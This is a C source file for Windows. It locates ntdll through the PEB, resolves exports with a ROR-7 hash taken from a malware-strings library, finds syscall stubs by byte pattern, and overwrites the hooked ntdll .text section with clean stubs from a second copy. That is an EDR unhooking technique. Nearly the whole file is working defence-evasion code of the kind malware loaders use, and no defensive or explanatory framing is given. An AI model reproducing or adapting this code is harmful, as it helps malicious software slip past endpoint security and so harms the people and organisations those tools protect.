#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include "PrunsFart.h"

#define SYSCALL_STUB 23
#define DEREF( name )*(UINT_PTR *)(name)
#define DEREF_64( name )*(DWORD64 *)(name)


//-------------------------------------------------------------------------------------------------------------------------------------

typedef struct MyStruct {
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;
    PDWORD pdwAddressOfFunctions;
    PDWORD pdwAddressOfNames;
    PWORD  pwAddressOfNameOrdinales;
};

struct MyStruct ConfigStruct = { 0 };

VOID InitializeStruct(PVOID pNtdll, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory) {
    ConfigStruct.pImageExportDirectory = pImageExportDirectory;
    ConfigStruct.pdwAddressOfFunctions = (PDWORD)((PBYTE)pNtdll + pImageExportDirectory->AddressOfFunctions);
    ConfigStruct.pdwAddressOfNames = (PDWORD)((PBYTE)pNtdll + pImageExportDirectory->AddressOfNames);
    ConfigStruct.pwAddressOfNameOrdinales = (PWORD)((PBYTE)pNtdll + pImageExportDirectory->AddressOfNameOrdinals);
}

//-------------------------------------------------------------------------------------------------------------------------------------

// https://github.com/vxunderground/VX-API/blob/main/VX-API/MalwareStrings.h#L664
SIZE_T StringLengthA(LPCSTR String)
{
    LPCSTR String2;

    for (String2 = String; *String2; ++String2);

    return (String2 - String);
}

UINT32 HashStringRotr32SubA(UINT32 Value, UINT Count)
{
    DWORD Mask = (CHAR_BIT * sizeof(Value) - 1);
    Count &= Mask;
#pragma warning( push )
#pragma warning( disable : 4146)
    return (Value >> Count) | (Value << ((-Count) & Mask));
#pragma warning( pop ) 
}

INT HashStringRotr32A(PCHAR String)
{
    INT Value = 0;

    for (INT Index = 0; Index < StringLengthA(String); Index++)
        Value = String[Index] + HashStringRotr32SubA(Value, 7);

    return Value;
}

//-------------------------------------------------------------------------------------------------------------------------------------

PVOID GetDll(PWSTR FindName) {

    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)pLdr->InMemoryOrderModuleList.Flink;

    while (pDte) {
        PWSTR DllName = ((PLDR_DATA_TABLE_ENTRY)pDte)->FullDllName.Buffer;
        if (wcscmp(FindName, DllName) == 0) {
            return (PVOID)((PLDR_DATA_TABLE_ENTRY)pDte)->Reserved2[0];
        }
        pDte = DEREF_64(pDte);
    }
    return NULL;
}

//-------------------------------------------------------------------------------------------------------------------------------------


PVOID GetFunction(PVOID pNtdll, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, INT InFunctionHash) {

    if (ConfigStruct.pdwAddressOfFunctions == NULL || ConfigStruct.pdwAddressOfNames == NULL ||
        ConfigStruct.pImageExportDirectory == NULL || ConfigStruct.pwAddressOfNameOrdinales == NULL) {

        InitializeStruct(pNtdll, pImageExportDirectory);
    }

    for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pNtdll + ConfigStruct.pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pNtdll + ConfigStruct.pdwAddressOfFunctions[ConfigStruct.pwAddressOfNameOrdinales[cx]];

        if (HashStringRotr32A(pczFunctionName) == InFunctionHash) {
            WORD cw = 0;
            while (TRUE) {

                if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05) {
                    return NULL;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0xc3) {
                    return NULL;
                }

                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    && *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    && *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    && *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    && *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    && *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {

                    return pFunctionAddress;
                }

                cw++;
            }
        }
    }
    return NULL;
}

//-------------------------------------------------------------------------------------------------------------------------------------


VOID OverwriteNtdll(
    PVOID pLocalNtdll,
    PVOID pRemoteNdll,
    PIMAGE_EXPORT_DIRECTORY pLocalImageExportDirectory,
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory,
    PIMAGE_SECTION_HEADER TxtSextion) {


    PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pLocalNtdll + pLocalImageExportDirectory->AddressOfFunctions);
    PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pLocalNtdll + pLocalImageExportDirectory->AddressOfNames);
    PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pLocalNtdll + pLocalImageExportDirectory->AddressOfNameOrdinals);

    for (WORD cx = 0; cx < pLocalImageExportDirectory->NumberOfNames; cx++) {
        PCHAR pczFunctionName = (PCHAR)((PBYTE)pLocalNtdll + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pLocalNtdll + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        PVOID funcAddress = GetFunction(pRemoteNdll, pImageExportDirectory, HashStringRotr32A(pczFunctionName));
        if (funcAddress != NULL) {
            printf("[+] installed \'%s\' at [ 0x%p ]\n", pczFunctionName, funcAddress);
            
            DWORD Old;
            VirtualProtect((LPVOID)((DWORD_PTR)pLocalNtdll + (DWORD_PTR)TxtSextion->VirtualAddress), TxtSextion->Misc.VirtualSize, PAGE_EXECUTE_WRITECOPY, &Old);
            memcpy((LPVOID)pFunctionAddress, (LPVOID)funcAddress, SYSCALL_STUB);
            VirtualProtect((LPVOID)((DWORD_PTR)pLocalNtdll + (DWORD_PTR)TxtSextion->VirtualAddress), TxtSextion->Misc.VirtualSize, Old, &Old);
        }
    }
}

//-------------------------------------------------------------------------------------------------------------------------------------


void ReplaceNtdll(PVOID pLocalNtdll, PVOID pRemoteNdtll, PIMAGE_SECTION_HEADER TxtSextion) {

    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pRemoteNdtll;
    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pRemoteNdtll + pImageDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pRemoteNdtll + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    pImageDosHeader = (PIMAGE_DOS_HEADER)pLocalNtdll;
    pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pLocalNtdll + pImageDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pLocalImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pLocalNtdll + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);

    OverwriteNtdll(pLocalNtdll, pRemoteNdtll, pLocalImageExportDirectory, pImageExportDirectory, TxtSextion);

    free(pRemoteNdtll);
}
